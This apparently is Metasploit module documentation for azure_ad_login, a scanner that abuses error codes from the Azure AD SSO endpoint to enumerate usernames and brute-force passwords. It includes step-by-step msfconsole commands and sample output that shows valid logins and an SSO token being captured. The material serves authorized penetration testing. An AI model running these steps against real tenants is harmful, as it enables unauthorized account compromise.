## Vulnerable Application

The Microsoft Azure AD SSO service has a vulnerable endpoint that delivers an error-code based
response to specific authentication requests in XML. The endpoint, when passed the correct
credentials, will respond with a DesktopSsoToken that can be used to authenticate to Azure AD.
When the authentication is unsuccessful, the error code that is returned can be used to discover
the validity of usernames in the target tenant.
This module also reports credentials to the credentials database when they are discovered.

## Verification Steps


- [ ] Start `msfconsole`
- [ ] `use auxiliary/scanner/http/azure_ad_login`
- [ ] `show info`
- [ ] `set USER_FILE USER_FILE`
- [ ] `set PASS_FILE PASS_FILE`
- [ ] `set DOMAIN example.com`
- [ ] `run`
- [ ] Check output for validity of your test username(s), and password(s)


## Options

### DOMAIN

The target tenant domain to use for the username checks.

### USERNAME

A specific username to verify.

### PASSWORD

A specific password to verify.

### USER_FILE

A file with users, one per line.

### PASS_FILE

A file with passwords, one per line.
    

## Scenarios

### Azure AD Tenants with SSO Enabled
If a tenant's domain is known, you can use this module for username and password brute-forcing.

Specific target output replaced with *s so as not to disclose information

```
msf6 > use auxiliary/scanner/http/azure_ad_login
msf6 auxiliary(scanner/http/azure_ad_login) > set USER_FILE /home/kali/users.txt
USER_FILE => /home/kali/users.txt
msf6 auxiliary(scanner/http/azure_ad_login) > set PASS_FILE /home/kali/pass.txt
PASS_FILE => /home/kali/pass.txt
msf6 auxiliary(scanner/http/azure_ad_login) > set DOMAIN example.com
DOMAIN => example.com
msf6 auxiliary(scanner/http/azure_ad_login) > run

msf6 auxiliary(scanner/http/azure_ad_login) > run

[-] example.com\wrong is not a valid user
[-] example.com\wrong is not a valid user
[-] example.com\wrong is not a valid user
[-] example.com\k0pak4 is not a valid user
[-] example.com\k0pak4 is not a valid user
[-] example.com\k0pak4 is not a valid user
[+] Password password is invalid but example.com\**** is valid!
[+] Password Password1! is invalid but example.com\**** is valid!
[+] Login example.com\****:****** is valid!
[+] Desktop SSO Token: *******************************************
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

If a tenant's domain is known, you can enumerate their usernames
    
```
msf6 > use auxiliary/scanner/http/azure_ad_login
msf6 auxiliary(scanner/http/azure_ad_login) > set USER_FILE /home/kali/users.txt
USER_FILE => /home/kali/users.txt
msf6 auxiliary(scanner/http/azure_ad_login) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/http/azure_ad_login) > set DOMAIN example.com
DOMAIN => example.com
msf6 auxiliary(scanner/http/azure_ad_login) > run

[-] example.com\wrong is not a valid user
[-] example.com\k0pak4 is not a valid user
[+] Password password is invalid but example.com\**** is valid!
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
